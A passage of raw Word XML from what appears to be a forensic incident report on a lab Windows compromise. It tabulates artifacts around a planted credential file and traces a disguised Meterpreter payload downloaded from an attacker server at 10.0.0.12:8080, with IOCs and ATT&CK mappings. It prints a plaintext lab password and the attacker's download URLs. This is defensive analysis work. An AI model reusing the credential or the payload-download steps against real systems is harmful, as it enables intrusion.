        <w:t xml:space="preserve">  - Windows Timeline 'not_my_pass.txt (Notepad)' at 11:13:57, with the Notepad session open until 11:16:10</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>File content: the Windows Search index (SIDR) AutoSummary holds the content, 'user: medmondson  pass: password123!@#'.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Context: at this time the injected explorer.exe 7324 was active, having run net user administrator at 11:13:35, and it wrote its CLR usage log at 11:16:03.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Fact: the interactive user wrote the file through Notepad, launched from the legitimate explorer.exe 2432, during the active compromise. It holds a plaintext password for the local admin account medmondson. Its name and the lab context suggest it is planted bait for the hunt (the attacker's credential-harvesting target), not attacker output.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Hypothesis (not proven): the attacker read it through Meterpreter. Two points fit this:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- $SI LastAccess (11:15:54.73) is about 2 minutes after the last write.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Explorer 7324 was still alive at 11:16:03.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>But last-access updates on Windows 10 are unreliable and lazily flushed (up to 1 h), and Notepad, Explorer previews and SearchIndexer can also update them. There is no Sysmon file-read telemetry, no object-access auditing (4663), and the $LogFile only covers 12:08 onward. So access by the attacker cannot be confirmed or excluded.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Impact: treat the medmondson password as compromised in any case. The attacker already held this user's elevated token.</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11:07:47.909571</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>"C:\Windows\system32\NOTEPAD.EXE" C:\Users\medmondson\Desktop\New Text Document.txt</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 932, ProcessGUID: e6e9f951-0f03-654e-aa01-000000000500 | RuleName: - | MD5=F1139811BBF61362915958806AD30211,SHA256=F1D62648EF915D85CB4FC140359E925395D315C70F3566B63BB3E21151CB2CE3,IMPHASH=E2D17AC7541817AA681AE8FF7734AD89 | ParentProcess: C:\Windows\exp</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18675</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:46.742007</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Security 4798 | Microsoft-Windows-Security-Auditing | A user's local group membership was enumerated | Target: DESKTOP-KJ81A5A\medmondson (S-1-5-21-1841083384-974204330-411256071-1001) | SubjectLogonId: 0x153A9 | CallerProcessName: C:\Windows\System32\notepad.exe | CallerProcessId: 0x3A4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#27067</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:56.556811</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI creation (B)</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\Desktop\not_my_pass.txt</w:t>
              <w:br/>
              <w:t>size=38</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#112639</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:56.728699</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\Desktop\not_my_pass.txt</w:t>
              <w:br/>
              <w:t>FileCreate [Archive] entry=83576-2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#134462</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:56.556811</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: OpenSavePidlMRU</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Opened/saved via dialog box</w:t>
              <w:br/>
              <w:t>This PC\Desktop\not_my_pass.txt</w:t>
              <w:br/>
              <w:t>txt mru=0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261019151050/recmd_kroll_C_OpenSavePidlMRU.csv#2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:56.556811</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: LastVisitedPidlMRU</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Folder used by an application (dialog box)</w:t>
              <w:br/>
              <w:t>This PC\Desktop</w:t>
              <w:br/>
              <w:t>appli=NOTEPAD.EXE mru=0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261019151050/recmd_kroll_C_LastVisitedPidlMRU.csv#1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:56</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>LNK files</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>LNK modified (≈ last opening) ; Target: created (recorded in the LNK) ; Target: modified (recorded in the LNK) ; Target: accessed (recorded in the LNK)</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\Desktop\not_my_pass.txt</w:t>
              <w:br/>
              <w:t>machine=desktop-kj81a5a MAC=00:0c:29:27:f7:8f volume=026F16D0 Fixed storage media (Hard drive) size=38</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>lecmd/lnk_C.csv#12</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\users\medmondson\Appdata\Roaming\Microsoft\Windows\Recent\not_my_pass.txt.lnk</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:56.556811</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Windows Search (indexed files)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Indexed file: created</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\Desktop\not_my_pass.txt</w:t>
              <w:br/>
              <w:t>.txt size=38 owner=DESKTOP-KJ81A5A\medmondson user: medmondson</w:t>
              <w:br/>
              <w:br/>
              <w:t>pass: password123!@#</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>sidr/DESKTOP-KJ81A5A_File_Report_20261019_151100.037119200.csv#1215</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\programdata\microsoft\search\data\applications\windows\Windows.edb</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:57</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Windows Timeline (ActivitiesCache)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Activity: start ; Activity: last modified</w:t>
              <w:br/>
              <w:t>System\notepad.exe</w:t>
              <w:br/>
              <w:t>not_my_pass.txt (Notepad) C:\Users\medmondson\Desktop\not_my_pass.txt (file:Unmapped GUID: //C:/Users/medmondson/Desktop/not_mypass.txt?VolumeId={B82366D2-0E5B-4C77-832C-871CFA42F90B}&amp;ObjectId={CA1D2D78-7FB5-11EE-8A95-000C2927F78F}&amp;KnownFolderId=ThisPCDesktopFolder&amp;KnownFolderLength=27) type=ExecuteOpen</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>wxtcmd/C/users/medmondson/Appdata/Local/ConnectedDevicesPlatform/L.medmondson/20261019171100_medmondson_Activity.csv#86</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\users\medmondson\Appdata\Local\ConnectedDevicesPlatform\L.medmondson\ActivitiesCache.db</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:42:05.178200</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Jump Lists (automatic)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Jump List: entry created (≈ first opened)</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\Desktop\not_my_pass.txt</w:t>
              <w:br/>
              <w:t>Notepad 64-bit interactions=1 machine=desktop-kj81a5a</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>jlecmd/20261019151058_AutomaticDestinations.csv#7</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\users\medmondson\Appdata\Roaming\Microsoft\Windows\Recent\AutomaticDestinations\9b9cdc69c1c24e2b.automaticDestinations-ms</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:42:05.178200</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Jump Lists (automatic)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Jump List: entry created (≈ first opened)</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\Desktop\not_my_pass.txt</w:t>
              <w:br/>
              <w:t>Quick Access interactions=1 machine=desktop-kj81a5a</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>jlecmd/20261019151058_AutomaticDestinations.csv#2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\users\medmondson\Appdata\Roaming\Microsoft\Windows\Recent\AutomaticDestinations\5f7b5f1e01b83767.automaticDestinations-ms</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.8 Web browsing, downloads and e-mail</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Reviewed Dissect browser history and downloads (WebCache/Edge legacy, Firefox), IE WebCache history and downloads, Firefox history, downloads and form history, TypedURLs, $MFT Zone.Identifier ADS, Sysmon EID 22/15 and every non-Defender event that mentions 10.0.0.12.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>**Finding F-016 (high, confirmed): where pscp.exe came from**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- At 10:16:36 UTC, user medmondson browsed the attacker's web server in Edge: http://10.0.0.12/ and http://10.0.0.12:8080/.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- WebCache shows http://10.0.0.12:8080/pscp.exe visited repeatedly (visit count 4 and 8), last at 10:19:49.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- At 10:19:53 the browser recorded a download from that URL to Downloads\pscp.exe.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- The Zone.Identifier streams on $RHOVDEL.exe and C:\Payloads\pscp.exe both read ZoneId=3, HostUrl http://10.0.0.12:8080/pscp.exe, ReferrerUrl http://10.0.0.12:8080/.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- Defender's three detections line up with these download attempts.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>**Downloads without a Zone.Identifier**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- test.exe and 1.exe have no mark-of-the-web. Both were fetched with PowerShell Invoke-WebRequest (4104/4103 events and Sysmon 3 to 10.0.0.12:8080).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>**Recorded**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- Timeline event T-015.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- IOC I-015: http://10.0.0.12:8080/.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- A note covering the other web activity. It is all lab setup: Sysmon, the SwiftOnSecurity config, Firefox, KAPE, winpmem, PowerShell logging and .NET 4.5.2. Firefox form history also holds the analyst's personal details from the KAPE download form.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>**Negative results**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- No DNS queries for the C2 (it was contacted by IP only).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- No searches showing attacker intent.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-016: Web origin of the Meterpreter payload: Edge (WebCache) browsing to http://10.0.0.12:8080/ and download of pscp.exe, MOTW preserved on C:\Payloads\pscp.exe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artifact:browser (downloads, dissect)</w:t>
              <w:br/>
              <w:t>artifact:browser (history, dissect)</w:t>
              <w:br/>
              <w:t>artifact:internet explorer / webcache (downloads)</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-powershell%4operational.evtx</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-sysmon%4operational.evtx</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-windows defender%4operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Category</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>initial access</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>MITRE ATT&amp;CK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>T1105, T1204.002, T1036.005</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
